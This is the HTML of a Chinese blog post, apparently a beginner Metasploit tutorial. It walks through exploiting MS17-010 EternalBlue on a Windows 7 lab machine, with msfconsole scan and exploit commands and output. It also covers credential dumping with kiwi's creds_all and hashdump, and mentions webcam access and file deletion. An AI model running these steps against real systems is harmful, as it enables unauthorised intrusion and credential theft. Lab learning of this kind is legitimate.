@@ -1,0 +1,709 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>metasploit渗透测试入门 | Hexo</title>
+  <meta name="description" content="metasploit渗透测试入门    WannaCry勒索病毒席卷全球，一旦中了WannaCry病毒电脑文件会被“加密劫持”，黑客要求受害者支付高昂赎金（比特币）才能拿到解密秘钥。 而这枚WannaCry勒索病毒，就是黑客拿着美国安全局泄露的永恒之蓝攻击代码进行研制，并进行大肆勒索传播。 MS17-010是Windows SMBv1服务中存在的远程代码执行漏洞； • 开启SMB服务（ 445端口">
+<meta property="og:type" content="article">
+<meta property="og:title" content="metasploit渗透测试入门">
+<meta property="og:url" content="http://localhost:4000/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:site_name" content="uucto">
+<meta property="og:description" content="metasploit渗透测试入门    WannaCry勒索病毒席卷全球，一旦中了WannaCry病毒电脑文件会被“加密劫持”，黑客要求受害者支付高昂赎金（比特币）才能拿到解密秘钥。 而这枚WannaCry勒索病毒，就是黑客拿着美国安全局泄露的永恒之蓝攻击代码进行研制，并进行大肆勒索传播。 MS17-010是Windows SMBv1服务中存在的远程代码执行漏洞； • 开启SMB服务（ 445端口">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://localhost:4000/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/eda8f852311aeedff007fa3c146d4a0ccb113e3e.png">
+<meta property="og:image" content="http://localhost:4000/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/5a10b2b436d19787fabe4a53785605bf3e48d9d0.png">
+<meta property="og:image" content="http://localhost:4000/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/a407b4cba8e4b90ee8e7fd7d59b2d52996bf8f22.png">
+<meta property="og:image" content="http://localhost:4000/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/2a26300befbffa17c2ba8ecadb69c3c8b45991d0.png">
+<meta property="og:image" content="http://localhost:4000/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/0862cf5b165437ac801778afa9704d627edc4618.png">
+<meta property="og:image" content="http://localhost:4000/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/2ace2cb635e639587e21a850f0b364cf76eef144.png">
+<meta property="og:image" content="http://localhost:4000/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/f65b3dca8ecb31a23577e4e6ba6962faa3e87ee9.png">
+<meta property="og:image" content="http://localhost:4000/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/d09f62c099a26f1f397576023f83af77ad0d31f3.png">
+<meta property="og:image" content="http://localhost:4000/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/4bc0ab674fd9e7529eb6ac5d7538693e1c0dd92a.png">
+<meta property="og:image" content="http://localhost:4000/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/66ba7fc4908ffcfa0b7b82bc686e3820438307c5.png">
+<meta property="og:image" content="http://localhost:4000/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/9eec7d01622ce0d8fcd9640995e2de29933f3a7f.png">
+<meta property="og:image" content="http://localhost:4000/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/588549d38cf8fc5ce11280eb3b1cc2b9f7ee8d1b.png">
+<meta property="og:image" content="http://localhost:4000/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/6fe033baccfc41288ad6d787c56426f8b75705e9.png">
+<meta property="og:image" content="http://localhost:4000/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/dd1b7a71f912663ff9bcc131969d1409525cce78.png">
+<meta property="og:image" content="http://localhost:4000/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/4d4f742c5f19cef39b952324c9c120b4a61ed63c.png">
+<meta property="og:image" content="http://localhost:4000/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/01a74c8cbd00d662af1d6e41c15dbd613947e9e3.jpg">
+<meta property="og:image" content="http://localhost:4000/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/85a98c0d5bb71142f0e74a173b6faf1bc6d24a53.gif">
+<meta property="og:image" content="http://localhost:4000/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/7976c0056e23f81c48a5e58c3c590d627a882e33.png">
+<meta property="og:image" content="http://localhost:4000/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/0d1cb80ec5a6b930880952b22bcafd244716b33d.png">
+<meta property="og:image" content="http://localhost:4000/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/fec279cd0cec3e3ebd0f93b1ffb8ee97ad616631.png">
+<meta property="article:published_time" content="2024-11-15T11:48:49.000Z">
+<meta property="article:modified_time" content="2024-11-15T12:17:38.905Z">
+<meta property="article:author" content="侯哥">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://localhost:4000/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/eda8f852311aeedff007fa3c146d4a0ccb113e3e.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://localhost:4000/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="uucto" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/cofess" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">侯哥</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">DBA &amp; CTFer</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Guangzhou, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">项目</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">书单</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">友链</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/cofess" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/cofess" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/other/">other</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/" rel="tag">crypto</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/crypto/" style="font-size: 14px;">crypto</a> <a href="/tags/misc/" style="font-size: 13px;">misc</a> <a href="/tags/web/" style="font-size: 13px;">web</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">十一月 2024</a><span class="archive-list-count">11</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2024/11/15/Hashcat%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" class="title">Hashcat使用教程</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-11-15T13:50:13.000Z" itemprop="datePublished">2024-11-15</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/other/">other</a>
+              </p>
+              <p class="item-title">
+                <a href="/2024/11/15/%E4%B8%80%E4%B8%AA%E7%BB%8F%E5%85%B8%E7%9A%84%E5%85%AC%E5%8F%B8%E8%B4%A2%E5%8A%A1%E6%8A%A5%E8%A1%A8%E5%88%86%E6%9E%90%E6%A1%88%E4%BE%8B/" class="title">一个经典的公司财务报表分析案例</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-11-15T13:43:10.000Z" itemprop="datePublished">2024-11-15</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2024/11/15/john%E5%B7%A5%E5%85%B7%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/" class="title">john工具破解密码</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-11-15T13:31:09.000Z" itemprop="datePublished">2024-11-15</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/" class="title">CTF-图片隐写那些事儿</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-11-15T13:26:39.000Z" itemprop="datePublished">2024-11-15</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/web/">web</a>
+              </p>
+              <p class="item-title">
+                <a href="/2024/11/15/wireshark-%E8%B7%9F%E8%B8%AA%E6%95%B0%E6%8D%AE%E6%B5%81/" class="title">wireshark 跟踪数据流</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-11-15T13:20:24.000Z" itemprop="datePublished">2024-11-15</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-metasploit渗透测试入门" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      metasploit渗透测试入门
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/" class="article-date">
+	  <time datetime="2024-11-15T11:48:49.000Z" itemprop="datePublished">2024-11-15</time>
+	</a>
+</span>
+        
+        
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/#comments" class="article-comment-link">评论</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="metasploit渗透测试入门"><a href="#metasploit渗透测试入门" class="headerlink" title="metasploit渗透测试入门"></a>metasploit渗透测试入门</h1><img src="/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/eda8f852311aeedff007fa3c146d4a0ccb113e3e.png" class="" title="loading-ag-445">
+
+<img src="/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/5a10b2b436d19787fabe4a53785605bf3e48d9d0.png" class="">
+
+<p>WannaCry勒索病毒席卷全球，一旦中了WannaCry病毒电脑文件会被“加密劫持”，黑客要求受害者支付高昂赎金（比特币）才能拿到解密秘钥。 而这枚WannaCry勒索病毒，就是黑客拿着美国安全局泄露的永恒之蓝攻击代码进行研制，并进行大肆勒索传播。</p>
+<p>MS17-010是Windows SMBv1服务中存在的远程代码执行漏洞；<br> • 开启SMB服务（ 445端口） 的的系统可被执行远程代码， 从而导致被远程控制；<br> • 受影响系统： Windows XP、 Windows 7&#x2F;8&#x2F;10、 Server 2003&#x2F;2008&#x2F;2012&#x2F;2016</p>
+<p>只要用户打上MS17-010这个补丁，就可以避免这次攻击。</p>
+<h2 id="MSF-基础简介"><a href="#MSF-基础简介" class="headerlink" title="MSF 基础简介"></a>MSF 基础简介</h2><p>Metasploit 是一个渗透测试平台，使您能够查找，利用和验证漏洞。该平台包括 Metasploit 框架及其商业对手，如 Metasploit Pro。 Metasploit 目前是全球最常见的渗透测试框架，位居 secTools 排行榜第 2 位。</p>
+<p>metasploit是一款kali自带的漏洞利用神器，在接下来的2个案例中，我们将<u>利用WIN7主机的ms17-010漏洞和XP主机的ms08-067漏洞</u>，进行渗透攻击演示，并获得目标主机的控制权，带你闯进渗透测试的神之领域。实验可以参考David Kennedy的《Metasploit:The Penetration Tester’s Guide》，清华大学诸葛建伟老师翻译的《Metasploit渗透测试指南》。</p>
+<p>在<strong>kali虚拟机</strong>中打开<strong>metasploit</strong>，命令行输入：<code>msfconsole</code></p>
+<p><mark>MSF 模块组织按照不同的用途分为 7 种类型的模块（Modules）：</mark></p>
+<p>1、辅助模块 Auxiliary（Aux)，执行扫描之类的动作</p>
+<p>2、渗透攻击模块 Exploits，用于实际发起渗透攻击</p>
+<p>3、攻击载荷模块（payloads) 目标系统被成功渗透后执行的代码，payload 中的主要内容包括 shellcode，一段获取 shell 的代码。</p>
+<p>后面这几个模块一般不是很常用，大家简单的了解一下</p>
+<p>4、后渗透攻击模块（Post)</p>
+<p>5、编码器模块（Encoders)</p>
+<p>6、空指令模块（Nops)</p>
+<p>7、免杀模块 （evasion)</p>
+<p><mark>MSF 常用命令</mark></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">search 根据关键字搜索模块 </span><br><span class="line">show auxiliary 查看所有可用的辅助攻击模块 </span><br><span class="line">show exploits 查看所有可用的渗透攻击模块 </span><br><span class="line">show targets 查看所有载荷代码</span><br><span class="line">show options </span><br><span class="line">info 显示模块的详细信息 </span><br><span class="line">use 使用指定的测试模块 </span><br><span class="line">back 退出一级</span><br><span class="line">exit 退出</span><br><span class="line">set/unset 设置/取消 当前模块的参数</span><br><span class="line">run/exploit 执行扫描/渗透（2都相同效果）</span><br></pre></td></tr></table></figure>
+
+<p>实战：ms17-010 永恒之蓝</p>
+<p>查找 ms17-010 漏洞模块，搜索ms17-010相关漏洞利用代码：<br>msf5 &gt; search ms17-010</p>
+<img src="/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/a407b4cba8e4b90ee8e7fd7d59b2d52996bf8f22.png" class="">
+
+<img src="/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/2a26300befbffa17c2ba8ecadb69c3c8b45991d0.png" class="">
+
+<img src="/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/0862cf5b165437ac801778afa9704d627edc4618.png" class="">
+
+<img src="/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/2ace2cb635e639587e21a850f0b364cf76eef144.png" class="">
+
+<h5 id="实战：ms17-010-永恒之蓝"><a href="#实战：ms17-010-永恒之蓝" class="headerlink" title="实战：ms17-010 永恒之蓝"></a><mark>实战：ms17-010 永恒之蓝</mark></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">需准备环境：Kali-Linux、Windows 7 虚拟机</span><br><span class="line">Kali-Linux ：192.168.182.128</span><br><span class="line">Windows 7： 192.168.182.134（确保处在同个网络下，能互相ping通）</span><br></pre></td></tr></table></figure>
+
+<p>第一步：</p>
+<p>查找 ms17-010 漏洞模块，搜索ms17-010相关漏洞利用代码：<br>msf6 &gt; search ms17-010</p>
+<img src="/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/f65b3dca8ecb31a23577e4e6ba6962faa3e87ee9.png" class="">
+
+<p>这里可以得到两个工具，其中</p>
+<p><strong>auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</strong>是永恒之蓝扫描模块，<strong>exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</strong>是永恒之蓝渗透代码，</p>
+<p>前者先扫描，若显示有漏洞，再用后者进行渗透。</p>
+<p>第二步：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">使用ms17-010扫描模块对靶机Win7进行扫描，才能进行下一步的渗透操作。</span><br><span class="line">msf6 &gt; use 3   //使用ms17-010扫描模块，对靶机Win7进行扫描</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set RHOST 192.168.86.132   //设置目标IP或网段</span><br><span class="line">RHOST =&gt; 192.168.86.132</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run   //执行扫描</span><br><span class="line"></span><br><span class="line">[+] 192.168.182.134:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)   //说明扫描到的这台win 7存在ms17-010漏洞</span><br><span class="line">[*] 192.168.182.134:445    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; back</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/d09f62c099a26f1f397576023f83af77ad0d31f3.png" class="">
+
+<p>从上图画红线处知道，扫描到的这台win7 存在ms17-010漏洞</p>
+<p>第三步：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用ms17-010渗透模块对靶机Win7进行渗透</span><br><span class="line">msf6 &gt; use 0   //使用ms17-010渗透模块对靶机Win7进行渗透</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options  //查看可设置的选项</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOST 192.168.182.134</span><br><span class="line">RHOST =&gt; 192.168.182.134   //设置渗透目标IP</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit   //执行渗透</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/4bc0ab674fd9e7529eb6ac5d7538693e1c0dd92a.png" class="">
+
+<img src="/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/66ba7fc4908ffcfa0b7b82bc686e3820438307c5.png" class="">
+
+<p>从上图可见已经成功渗透到win7。</p>
+<p>不信！那你可以用pwd，dir，shell 检查一下,或是execute -i -f cmd.exe来执行cmd命令，又或者可以screenshot截图</p>
+<img src="/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/9eec7d01622ce0d8fcd9640995e2de29933f3a7f.png" class="">
+
+<img src="/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/588549d38cf8fc5ce11280eb3b1cc2b9f7ee8d1b.png" class="">
+
+<p>或者也可以用以下2条命令查看系统用户名和密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/6fe033baccfc41288ad6d787c56426f8b75705e9.png" class="">
+
+<p>到了这里，上面这些命令的执行，都是后渗透测试的问题了，既是windows下的cmd命令及其相关操作的事情了。下面再来一个获得用户hash值的命令</p>
+<p><code>run post/windows/gather/hashdump</code></p>
+<img src="/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/dd1b7a71f912663ff9bcc131969d1409525cce78.png" class="">
+
+<img src="/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/4d4f742c5f19cef39b952324c9c120b4a61ed63c.png" class="">
+
+<p>注：不要忘记了保存哦，下次可以直接再利用哈～下面借别人的图展示：</p>
+<img src="/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/01a74c8cbd00d662af1d6e41c15dbd613947e9e3.jpg" class="">
+
+<p>后渗透测试中会有很多好玩的指令操作，如打开摄像头，删除文件，删除目标主机目录，创建系统用户等等。</p>
+<img src="/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/85a98c0d5bb71142f0e74a173b6faf1bc6d24a53.gif" class="">
+
+<img src="/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/7976c0056e23f81c48a5e58c3c590d627a882e33.png" class="">
+
+<img src="/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/0d1cb80ec5a6b930880952b22bcafd244716b33d.png" class="">
+
+<img src="/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/fec279cd0cec3e3ebd0f93b1ffb8ee97ad616631.png" class="">
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://localhost:4000/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/" title="metasploit渗透测试入门" target="_blank" rel="external">http://localhost:4000/2024/11/15/metasploit渗透测试入门/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/cofess" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
